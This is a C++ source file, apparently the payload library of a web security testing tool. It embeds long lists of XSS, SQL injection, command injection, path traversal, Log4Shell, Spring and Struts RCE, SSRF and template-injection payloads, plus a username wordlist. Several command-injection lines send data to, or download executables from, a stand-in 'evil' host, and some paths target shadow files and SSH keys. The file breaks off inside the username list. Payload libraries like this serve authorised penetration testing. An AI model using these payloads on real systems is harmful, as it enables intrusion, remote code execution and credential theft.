#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>

#ifdef small
#undef small
#endif

#include "payload_library.hpp"

#include "helpers/diag_log.hpp"

#include <algorithm>
#include <atomic>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <mutex>
#include <sstream>
#include <unordered_map>

namespace aida {
namespace burp {
namespace payloads {

namespace {

struct state_t
{
    std::mutex                                          mtx;
    std::unordered_map<std::string, payload_set_t>      sets;
    std::atomic<bool>                                   initialized{false};
    std::mutex                                          err_mtx;
    std::string                                         last_err;
};

state_t& s() { static state_t st; return st; }

void set_err(const std::string& msg)
{
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.err_mtx);
    st.last_err = msg;
}

std::vector<std::string> split_lines(const char* blob)
{
    std::vector<std::string> out;
    if (!blob) return out;
    const char* p = blob;
    std::string cur;
    while (*p)
    {
        if (*p == '\n')
        {
            if (!cur.empty()) out.push_back(cur);
            cur.clear();
        }
        else if (*p != '\r')
        {
            cur.push_back(*p);
        }
        ++p;
    }
    if (!cur.empty()) out.push_back(cur);
    return out;
}

std::string sanitize_set_id(const std::string& id)
{
    std::string out;
    out.reserve(id.size());
    for (char c : id)
    {
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
            c == '_' || c == '-' || c == '/' || c == '.')
            out.push_back(c);
        else
            out.push_back('_');
    }
    return out;
}

std::string storage_path_for(const std::string& id)
{
    std::string flat = sanitize_set_id(id);
    std::replace(flat.begin(), flat.end(), '/', '_');
    return storage_dir() + flat + ".txt";
}

static const char* kXssPolyglot =
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n"
    "<svg onload=alert(1)>\n"
    "<img src=x onerror=alert(1)>\n"
    "<script>alert(1)</script>\n"
    "\"><script>alert(1)</script>\n"
    "'><script>alert(1)</script>\n"
    "</title><script>alert(1)</script>\n"
    "</textarea><script>alert(1)</script>\n"
    "</style><script>alert(1)</script>\n"
    "javascript:alert(1)\n"
    "data:text/html,<script>alert(1)</script>\n"
    "<iframe src=javascript:alert(1)>\n"
    "<body onload=alert(1)>\n"
    "<details open ontoggle=alert(1)>\n"
    "<marquee onstart=alert(1)>\n"
    "<input autofocus onfocus=alert(1)>\n"
    "<svg><script>alert&#40;1&#41;</script>\n"
    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(1)>\">\n"
    "<a href=\"javascript:alert(1)\">click</a>\n"
    "<form action=javascript:alert(1)><input type=submit>\n"
    "<isindex action=javascript:alert(1) type=submit value=click>\n"
    ;

static const char* kXssStandard =
    "<script>alert('XSS')</script>\n"
    "<script>alert(String.fromCharCode(88,83,83))</script>\n"
    "<script src=//evil/x></script>\n"
    "<img src=x onerror=alert(1)>\n"
    "<img src=javascript:alert(1)>\n"
    "<img src=\"javascript:alert(1)\">\n"
    "<img src=`javascript:alert(1)`>\n"
    "<img src=\"javascript:alert(&quot;1&quot;)\">\n"
    "<IMG SRC=jav&#x09;ascript:alert(1)>\n"
    "<IMG SRC=jav&#x0A;ascript:alert(1)>\n"
    "<IMG SRC=jav&#x0D;ascript:alert(1)>\n"
    "<svg onload=alert(1)>\n"
    "<svg/onload=alert(1)>\n"
    "<svg><script>alert(1)</script></svg>\n"
    "<body onload=alert(1)>\n"
    "<body/onload=alert(1)>\n"
    "<body background=javascript:alert(1)>\n"
    "<iframe src=javascript:alert(1)>\n"
    "<iframe srcdoc=\"<script>alert(1)</script>\">\n"
    "<input onfocus=alert(1) autofocus>\n"
    "<input onblur=alert(1) autofocus><input autofocus>\n"
    "<keygen autofocus onfocus=alert(1)>\n"
    "<video><source onerror=alert(1)>\n"
    "<audio src=x onerror=alert(1)>\n"
    "<details open ontoggle=alert(1)>\n"
    "<marquee onstart=alert(1)>\n"
    "<select autofocus onfocus=alert(1)>\n"
    "<textarea autofocus onfocus=alert(1)>\n"
    "<a href=\"javascript:alert(1)\">x</a>\n"
    "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>\n"
    "<form><button formaction=javascript:alert(1)>x\n"
    "<isindex action=javascript:alert(1) type=image>\n"
    "<object data=javascript:alert(1)>\n"
    "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>\n"
    "<embed src=javascript:alert(1)>\n"
    "<embed src=//evil/x>\n"
    "<math><a xlink:href=javascript:alert(1)>x</math>\n"
    "<table background=javascript:alert(1)>\n"
    "<base href=javascript:alert(1);// />\n"
    "\"><svg/onload=alert(1)//\n"
    "'><svg/onload=alert(1)//\n"
    "\";alert(1);//\n"
    "';alert(1);//\n"
    "`;alert(1);//\n"
    "</script><script>alert(1)</script>\n"
    "</title><svg/onload=alert(1)>\n"
    "</textarea><svg/onload=alert(1)>\n"
    "</style><svg/onload=alert(1)>\n"
    "</noscript><svg/onload=alert(1)>\n"
    "</template><svg/onload=alert(1)>\n"
    "{{constructor.constructor('alert(1)')()}}\n"
    "{{$on.constructor('alert(1)')()}}\n"
    "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}\n"
    "${alert(1)}\n"
    "${{constructor.constructor('alert(1)')()}}\n"
    "#{alert(1)}\n"
    "{{7*7}}\n"
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
    "javascript://-->\");alert(1);//\n"
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//\n"
    "javascript:eval('alert(1)')\n"
    "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n"
    "vbscript:msgbox(\"XSS\")\n"
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n"
    "<!--><script>alert(1)</script -->\n"
    "<style>@import 'javascript:alert(1)';</style>\n"
    "<style>body{background:url(\"javascript:alert(1)\")}</style>\n"
    "<link rel=stylesheet href=javascript:alert(1)>\n"
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>\n"
    "<svg><animateTransform onbegin=alert(1) attributeName=transform>\n"
    "<svg><set onbegin=alert(1) attributeName=x to=y>\n"
    "<svg><discard onbegin=alert(1)>\n"
    "<xss id=x tabindex=1 onactivate=alert(1)></xss>\n"
    "<xss style=\"behavior:url(#default#userData)\" id=x>\n"
    "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script>\n"
    "<dialog open ontoggle=alert(1)>\n"
    "<frameset><frame src=javascript:alert(1)>\n"
    "<frame src=javascript:alert(1)>\n"
    "<applet code=javascript:alert(1)>\n"
    "<menuitem onclick=alert(1)>x\n"
    "<svg><g onload=alert(1)></g></svg>\n"
    "<svg><image href=x onerror=alert(1)>\n"
    "<svg><use href=#x onload=alert(1)>\n"
    "<svg><a><circle r=400></circle><text x=10 y=20>x</text><animate attributeName=href values=javascript:alert(1) /></a>\n"
    "<x onclick=alert(1) onkeydown=alert(1) onmouseover=alert(1)>x</x>\n"
    "<a onclick=alert(1) href=#>x</a>\n"
    "%3Cscript%3Ealert(1)%3C/script%3E\n"
    "%253Cscript%253Ealert(1)%253C/script%253E\n"
    "<script>alert(1)</script>\n"
    "&lt;script&gt;alert(1)&lt;/script&gt;\n"
    "&#60;script&#62;alert(1)&#60;/script&#62;\n"
    "<scr<script>ipt>alert(1)</scr</script>ipt>\n"
    "<svg><script>123<a>alert(1)</script></svg>\n"
    "<SCRIPT>alert('XSS')</SCRIPT>\n"
    "<ScRiPt>alert(1)</ScRiPt>\n"
    "<script\x20type=\"text/javascript\">alert(1)</script>\n"
    "<script\x09>alert(1)</script>\n"
    "<script\x0c>alert(1)</script>\n"
    "<script>/* */alert(1)/* */</script>\n"
    "<script>void/* */alert(1)</script>\n"
    "<script>setTimeout('alert(1)',0)</script>\n"
    "<script>setInterval('alert(1)',999)</script>\n"
    "<script>Function('alert(1)')()</script>\n"
    "<script>new Function('alert(1)')()</script>\n"
    "<script>window['alert'](1)</script>\n"
    "<script>this['alert'](1)</script>\n"
    "<script>(()=>{alert(1)})()</script>\n"
    "<script>eval(atob('YWxlcnQoMSk='))</script>\n"
    ;

static const char* kSqliError =
    "'\n"
    "\"\n"
    "`\n"
    "''\n"
    "'\"\n"
    "\\\n"
    "')\n"
    "'))\n"
    "''')\n"
    "' OR '1'='1\n"
    "\" OR \"1\"=\"1\n"
    "' OR 1=1--\n"
    "' OR 1=1#\n"
    "' OR 1=1/*\n"
    "admin'--\n"
    "admin'#\n"
    "admin'/*\n"
    "' UNION SELECT NULL--\n"
    "' UNION SELECT NULL,NULL--\n"
    "' UNION SELECT NULL,NULL,NULL--\n"
    "' AND extractvalue(1, concat(0x7e, version()))-- -\n"
    "' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)-- -\n"
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -\n"
    "' AND 1=CONVERT(int,@@version)--\n"
    "' AND CAST((SELECT @@version) AS int)--\n"
    "'; EXEC sp_who--\n"
    "'; DROP TABLE x--\n"
    "' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(6765=6765,1))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\n"
    "'+(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)+'\n"
    "1 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))\n"
    "1 AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))\n"
    "1; SELECT pg_sleep(0)--\n"
    "1 AND 1=cast(pg_sleep(0) as text)--\n"
    "1' AND 1=cast(version() as integer)--\n"
    "1' AND extractvalue(rand(),concat(0x3a,(SELECT user())))-- -\n"
    "'; SELECT json_extract(load_extension('libsqlite3.so')); --\n"
    "'); SELECT CASE WHEN (1=1) THEN 1 ELSE cast(1/0 as int) END--\n"
    ;

static const char* kSqliBoolean =
    "' AND '1'='1\n"
    "' AND '1'='2\n"
    "1 AND 1=1\n"
    "1 AND 1=2\n"
    "' OR '1'='1' --\n"
    "' OR '1'='2' --\n"
    "1) AND 1=1--\n"
    "1) AND 1=2--\n"
    "1)) AND 1=1--\n"
    "1)) AND 1=2--\n"
    "1' AND SUBSTRING((SELECT @@version),1,1)='5\n"
    "1' AND SUBSTRING((SELECT @@version),1,1)='Z\n"
    "1' AND ASCII(SUBSTRING(@@version,1,1))>0--\n"
    "1' AND ASCII(SUBSTRING(@@version,1,1))<0--\n"
    "1' AND LENGTH(database())>0--\n"
    "1' AND LENGTH(database())<0--\n"
    "' OR NOT '1'='2\n"
    "' OR EXISTS(SELECT 1)--\n"
    "' OR NOT EXISTS(SELECT 1)--\n"
    "' AND 'a'='a\n"
    "' AND 'a'='b\n"
    ;

static const char* kSqliTime =
    "' AND SLEEP(5)-- -\n"
    "' OR SLEEP(5)-- -\n"
    "'; SELECT SLEEP(5)-- -\n"
    "'; WAITFOR DELAY '0:0:5'-- -\n"
    "1; WAITFOR DELAY '0:0:5'-- -\n"
    "1 AND IF(1=1, SLEEP(5), 0)-- -\n"
    "1; SELECT pg_sleep(5)--\n"
    "1 AND pg_sleep(5)--\n"
    "1' AND pg_sleep(5)--\n"
    "1' UNION SELECT pg_sleep(5)--\n"
    "1; SELECT IF(1=1, SLEEP(5), 0)--\n"
    "1; SELECT BENCHMARK(5000000, MD5('a'))--\n"
    "1' AND BENCHMARK(5000000,MD5('a'))-- -\n"
    "1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0, SLEEP(5), 0)-- -\n"
    "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--\n"
    "1; SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--\n"
    "1' AND dbms_pipe.receive_message(('a'),5)-- -\n"
    "1' AND (SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END)-- -\n"
    "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -\n"
    ;

static const char* kCmdiUnix =
    "; id\n"
    "; uname -a\n"
    "; cat /etc/passwd\n"
    "; ls -la\n"
    "| id\n"
    "| uname -a\n"
    "& id\n"
    "&& id\n"
    "&&id\n"
    "|| id\n"
    "`id`\n"
    "$(id)\n"
    "$(`id`)\n"
    "\";id\n"
    "';id\n"
    "; sleep 5\n"
    "| sleep 5\n"
    "&& sleep 5\n"
    "`sleep 5`\n"
    "$(sleep 5)\n"
    ";`sleep 5`\n"
    "; ping -c 5 127.0.0.1\n"
    "| ping -c 5 127.0.0.1\n"
    "; curl http://evil/$(id|base64)\n"
    "; wget http://evil/$(id|base64)\n"
    "%0a id\n"
    "%0a sleep 5\n"
    "\";sleep 5;\"\n"
    "';sleep 5;'\n"
    "{cat,/etc/passwd}\n"
    "/???/c?t /etc/passwd\n"
    "/bin/sh -c id\n"
    "/bin/bash -c id\n"
    ";${IFS}id\n"
    "%26id%26\n"
    "%7Cid\n"
    "%3Bsleep+5\n"
    ;

static const char* kCmdiWindows =
    "& whoami\n"
    "&& whoami\n"
    "| whoami\n"
    "|| whoami\n"
    "& dir\n"
    "&& dir\n"
    "| dir\n"
    "& systeminfo\n"
    "& ipconfig\n"
    "& net user\n"
    "& net localgroup administrators\n"
    "& type c:\\windows\\win.ini\n"
    "& powershell -c whoami\n"
    "& powershell -enc dwBoAG8AYQBtAGkA\n"
    "& certutil -urlcache -split -f http://evil/x x.exe\n"
    "& bitsadmin /transfer x /priority foreground http://evil/x.exe c:\\x.exe\n"
    "& ping -n 5 127.0.0.1\n"
    "& timeout /t 5\n"
    "& choice /d y /t 5 > nul\n"
    "%0a& whoami\n"
    "%0d%0a& whoami\n"
    "; whoami\n"
    "; dir\n"
    "; type c:\\windows\\win.ini\n"
    "& cmd /c whoami\n"
    "& cmd.exe /c whoami\n"
    "& findstr /si pass *.ini *.txt\n"
    ;

static const char* kLfiUnix =
    "/etc/passwd\n"
    "../etc/passwd\n"
    "../../etc/passwd\n"
    "../../../etc/passwd\n"
    "../../../../etc/passwd\n"
    "../../../../../etc/passwd\n"
    "../../../../../../etc/passwd\n"
    "../../../../../../../etc/passwd\n"
    "../../../../../../../../etc/passwd\n"
    "../../../../../../../../../etc/passwd\n"
    "../../../../../../../../../../etc/passwd\n"
    "/etc/shadow\n"
    "/etc/hostname\n"
    "/etc/hosts\n"
    "/etc/resolv.conf\n"
    "/etc/issue\n"
    "/etc/group\n"
    "/etc/profile\n"
    "/etc/motd\n"
    "/proc/self/environ\n"
    "/proc/self/cmdline\n"
    "/proc/self/cwd\n"
    "/proc/self/exe\n"
    "/proc/self/status\n"
    "/proc/version\n"
    "/proc/cpuinfo\n"
    "/proc/mounts\n"
    "/var/log/auth.log\n"
    "/var/log/syslog\n"
    "/var/log/apache2/access.log\n"
    "/var/log/apache2/error.log\n"
    "/var/log/nginx/access.log\n"
    "/var/log/nginx/error.log\n"
    "/var/log/httpd/access_log\n"
    "/var/log/httpd/error_log\n"
    "/var/spool/mail/root\n"
    "/root/.bash_history\n"
    "/root/.ssh/id_rsa\n"
    "/root/.ssh/authorized_keys\n"
    "/home/user/.bash_history\n"
    "/home/user/.ssh/id_rsa\n"
    "/usr/local/etc/php.ini\n"
    "/etc/apache2/apache2.conf\n"
    "/etc/nginx/nginx.conf\n"
    "/etc/httpd/conf/httpd.conf\n"
    "file:///etc/passwd\n"
    "php://filter/convert.base64-encode/resource=/etc/passwd\n"
    "php://filter/read=convert.base64-encode/resource=index.php\n"
    "php://input\n"
    "data://text/plain,id\n"
    "expect://id\n"
    "zip://test.zip%23inner.txt\n"
    "..%2f..%2f..%2fetc%2fpasswd\n"
    "..%252f..%252f..%252fetc%252fpasswd\n"
    "....//....//....//etc/passwd\n"
    "....\\/....\\/....\\/etc/passwd\n"
    "..%c0%af..%c0%afetc%c0%afpasswd\n"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
    "..%5c..%5c..%5cetc%5cpasswd\n"
    "/etc/passwd%00\n"
    "/etc/passwd%2500\n"
    "/etc/passwd?\n"
    "/etc/passwd%23\n"
    ;

static const char* kLfiWindows =
    "C:\\windows\\win.ini\n"
    "C:\\boot.ini\n"
    "..\\windows\\win.ini\n"
    "..\\..\\windows\\win.ini\n"
    "..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
    "/windows/win.ini\n"
    "../windows/win.ini\n"
    "../../windows/win.ini\n"
    "../../../windows/win.ini\n"
    "../../../../windows/win.ini\n"
    "../../../../../windows/win.ini\n"
    "C:\\windows\\system32\\drivers\\etc\\hosts\n"
    "../windows/system32/drivers/etc/hosts\n"
    "../../windows/system32/drivers/etc/hosts\n"
    "C:\\windows\\repair\\sam\n"
    "C:\\windows\\repair\\system\n"
    "C:\\windows\\debug\\NetSetup.log\n"
    "C:\\windows\\system.ini\n"
    "C:\\windows\\panther\\unattend.xml\n"
    "C:\\windows\\panther\\unattended.xml\n"
    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_extend.log\n"
    "C:\\xampp\\apache\\logs\\access.log\n"
    "C:\\xampp\\apache\\logs\\error.log\n"
    "C:\\xampp\\php\\php.ini\n"
    "C:\\windows\\system32\\inetsrv\\config\\applicationHost.config\n"
    "C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadLine\\ConsoleHost_history.txt\n"
    "..%5cwindows%5cwin.ini\n"
    "..%252fwindows%252fwin.ini\n"
    "..%c0%5cwindows%c0%5cwin.ini\n"
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
    "C:\\windows\\win.ini%00\n"
    ;

static const char* kRceLog4j =
    "${jndi:ldap://AIDA_OOB/x}\n"
    "${jndi:rmi://AIDA_OOB/x}\n"
    "${jndi:dns://AIDA_OOB/x}\n"
    "${jndi:ldaps://AIDA_OOB/x}\n"
    "${jndi:iiop://AIDA_OOB/x}\n"
    "${jndi:corba://AIDA_OOB/x}\n"
    "${jndi:nis://AIDA_OOB/x}\n"
    "${jndi:nds://AIDA_OOB/x}\n"
    "${jndi:http://AIDA_OOB/x}\n"
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://AIDA_OOB/x}\n"
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//AIDA_OOB/x}\n"
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://AIDA_OOB/x}\n"
    "${jndi:${upper:l}${upper:d}${upper:a}${upper:p}://AIDA_OOB/x}\n"
    "${j${k8s:k5:-ND}i:ldap://AIDA_OOB/x}\n"
    "${j${::-n}d${::-i}:ldap://AIDA_OOB/x}\n"
    "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://AIDA_OOB/x}\n"
    "${${${::-j}}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://AIDA_OOB/x}\n"
    "${${::-${::-j}}${::-${::-n}}${::-${::-d}}${::-${::-i}}:${::-${::-l}}${::-${::-d}}${::-${::-a}}${::-${::-p}}://AIDA_OOB/x}\n"
    "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:${env:BARFOO:-l}${env:BARFOO:-d}${env:BARFOO:-a}${env:BARFOO:-p}://AIDA_OOB/x}\n"
    ;

static const char* kRceSpring =
    "${T(java.lang.Runtime).getRuntime().exec('id')}\n"
    "${T(java.lang.Runtime).getRuntime().exec('whoami')}\n"
    "${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}\n"
    "${@java.lang.Runtime@getRuntime().exec('id')}\n"
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n"
    "?class.module.classLoader.URLs[0]=0\n"
    "T(java.lang.Runtime).getRuntime().exec('id')\n"
    "%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D\n"
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n"
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
    "*{T(java.lang.Runtime).getRuntime().exec('id')}\n"
    ;

static const char* kRceStruts =
    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
    "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#x=@java.lang.Runtime@getRuntime().exec('id')}\n"
    "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('id'))}\n"
    "/struts/webconsole.html\n"
    "/struts/dojo/runtime.html\n"
    "redirect:${'%24%7BT(java.lang.Runtime).getRuntime().exec(\"id\")%7D'}\n"
    "action:${'%24%7BT(java.lang.Runtime).getRuntime().exec(\"id\")%7D'}\n"
    ;

static const char* kSsrfCloud =
    "http://169.254.169.254/\n"
    "http://169.254.169.254/latest/\n"
    "http://169.254.169.254/latest/meta-data/\n"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
    "http://169.254.169.254/latest/user-data/\n"
    "http://169.254.169.254/latest/dynamic/instance-identity/document\n"
    "http://169.254.170.2/v2/credentials/\n"
    "http://metadata.google.internal/\n"
    "http://metadata.google.internal/computeMetadata/v1/\n"
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
    "http://metadata.google.internal/computeMetadata/v1/project/project-id\n"
    "http://metadata/computeMetadata/v1/instance/service-accounts/default/token\n"
    "http://100.100.100.200/latest/meta-data/\n"
    "http://192.0.0.192/latest/meta-data/\n"
    "http://169.254.169.254/metadata/v1/maintenance\n"
    "http://169.254.169.254/openstack/latest/meta_data.json\n"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    "http://[::ffff:169.254.169.254]/latest/meta-data/\n"
    "http://0177.0.0.376/latest/meta-data/\n"
    "http://2852039166/latest/meta-data/\n"
    "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/\n"
    "http://169.254.169.254.nip.io/latest/meta-data/\n"
    ;

static const char* kSsrfLoopback =
    "http://localhost/\n"
    "http://127.0.0.1/\n"
    "http://127.1/\n"
    "http://0/\n"
    "http://0.0.0.0/\n"
    "http://[::]/\n"
    "http://[::1]/\n"
    "http://[0:0:0:0:0:ffff:127.0.0.1]/\n"
    "http://2130706433/\n"
    "http://0x7f000001/\n"
    "http://0177.0.0.1/\n"
    "http://127.0.0.1:22/\n"
    "http://127.0.0.1:80/\n"
    "http://127.0.0.1:443/\n"
    "http://127.0.0.1:3306/\n"
    "http://127.0.0.1:6379/\n"
    "http://127.0.0.1:5432/\n"
    "http://127.0.0.1:9200/\n"
    "http://127.0.0.1:11211/\n"
    "http://127.0.0.1:27017/\n"
    "http://localhost.attacker.com/\n"
    "http://attacker.com#@127.0.0.1/\n"
    "http://attacker.com@127.0.0.1/\n"
    "http://127.0.0.1.attacker.com/\n"
    "gopher://127.0.0.1:6379/_INFO\n"
    "gopher://127.0.0.1:25/_HELO%20a\n"
    "file:///etc/passwd\n"
    "file:///c:/windows/win.ini\n"
    "dict://127.0.0.1:11211/stats\n"
    "ldap://127.0.0.1/\n"
    "tftp://127.0.0.1/\n"
    ;

static const char* kSstiAll =
    "{{7*7}}\n"
    "${7*7}\n"
    "#{7*7}\n"
    "*{7*7}\n"
    "{{7*'7'}}\n"
    "${{7*7}}\n"
    "@{7*7}\n"
    "{7*7}\n"
    "<%= 7*7 %>\n"
    "{{=7*7}}\n"
    "{{config}}\n"
    "{{config.items()}}\n"
    "{{request}}\n"
    "{{self}}\n"
    "{{settings}}\n"
    "{{settings.SECRET_KEY}}\n"
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
    "{{cycler.__init__.__globals__.os.popen('id').read()}}\n"
    "{{joiner.__init__.__globals__.os.popen('id').read()}}\n"
    "{{namespace.__init__.__globals__.os.popen('id').read()}}\n"
    "{{lipsum.__globals__.os.popen('id').read()}}\n"
    "{{''.__class__.__mro__[1].__subclasses__()}}\n"
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n"
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
    "{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}\n"
    "${T(java.lang.Runtime).getRuntime().exec('id')}\n"
    "${@java.lang.Runtime@getRuntime().exec('id')}\n"
    "*{T(java.lang.Runtime).getRuntime().exec('id')}\n"
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
    "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}\n"
    "${(new java.io.BufferedReader(new java.io.InputStreamReader((new java.lang.ProcessBuilder('id').redirectErrorStream(true).start()).getInputStream()))).readLine()}\n"
    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]\n"
    "[(${T(java.lang.Runtime).getRuntime().exec('id')})]\n"
    "<%= system('id') %>\n"
    "<%= `id` %>\n"
    "<%= File.read('/etc/passwd') %>\n"
    "<%= File.open('/etc/passwd').read %>\n"
    "<%= Dir.entries('/') %>\n"
    "{{constructor.constructor('alert(1)')()}}\n"
    "{{$on.constructor('alert(1)')()}}\n"
    "{{toString.constructor('alert(1)')()}}\n"
    "{%for c in [1,2,3]%}{{c,c,c}}{%endfor%}\n"
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/hostname').read() }}\n"
    ;

static const char* kAuthUsernamesTop1000 =
    "admin\nadministrator\nroot\nuser\ntest\nguest\nsupport\nservice\nsa\noracle\npostgres\nmysql\nsqlserver\nbackup\nweb\nwww\napp\nstaff\nmanager\nsecretary\ndemo\ndaemon\nbin\nnobody\noperator\nftp\nmail\nsmtp\npop3\nimap\ndns\nnamed\nbind\ngames\nlist\nirc\nnews\nman\nproxy\nlp\nuucp\nrpm\nrpc\napache\nhttpd\nnginx\nlighttpd\ntomcat\njboss\nweblogic\nwebsphere\nmongo\nmongodb\nredis\ncouchdb\nelasticsearch\nmemcache\nmemcached\ncassandra\nrabbitmq\nactivemq\nzookeeper\nkafka\nstorm\nspark\nhadoop\nhdfs\nyarn\nhbase\nhive\npig\nimpala\noozie\nhue\nsentry\nranger\natlas\nzeppelin\njupyter\nrstudio\ndatabricks\nsnowflake\nredshift\nbigquery\ndatabase\ndb\ndba\ndev\ndeveloper\nqa\nstage\nstaging\nprod\nproduction\nrelease\ntest1\ntest2\ntestuser\ntester\ndefault\nany\nany1\ndomain\nlogin\nlogon\naccount\ncustomer\nclient\nbuyer\nseller\nvendor\npartner\nemployee\ncontractor\nintern\ntemp\nvisitor\nanonymous\nanon\npublic\nshared\ncommon\nbasic\nstandard\npremium\ngold\nplatinum\nvip\nfree\ntrial\nbeta\nalpha\nrc\nsysadmin\nsystem\nadmins\nadministrators\nsuperadmin\nsuperuser\nsupervisor\nroot1\nroot2\ntoor\nwheel\nuucp1\nadmin1\nadmin2\nadmin3\nadmin123\nadminadmin\npassword\nadm\nadminuser\nadmin_user\nweb_admin\nsystem_admin\nuser1\nuser2\nuser3\njoe\njohn\njane\nmary\nbob\nalice\ncharlie\ndavid\neve\nfrank\ngrace\nhenry\nivan\njack\nkate\nleo\nmike\nnina\noscar\npaul\nquincy\nrobert\nsara\ntom\numa\nvictor\nwendy\nxavier\nyolanda\nzach\n01\n02\n03\n04\n05\n06\n07\n08\n09\n10\n100\n101\n123\n1234\n12345\n123456\n1234567\n12345678\n123456789\n1\n2\n3\n4\n5\n6\n7\n8\n9\nabc\nabcd\nabcde\nabcdef\nabcdefg\nabcdefgh\nabcdefghi\nabcdefghij\nadmin01\nadmin02\nadmin10\nadmin11\nadmin99\nadministrator1\nadministrator01\nadministrator2\nroot1\nroot01\nroot10\nroot11\nuser01\nuser02\nuser10\nuser99\ntest01\ntest02\ntest10\ntest99\nguest1\nguest01\nguest10\nguest99\nsupport1\nsupport01\nsupport10\nsupport99\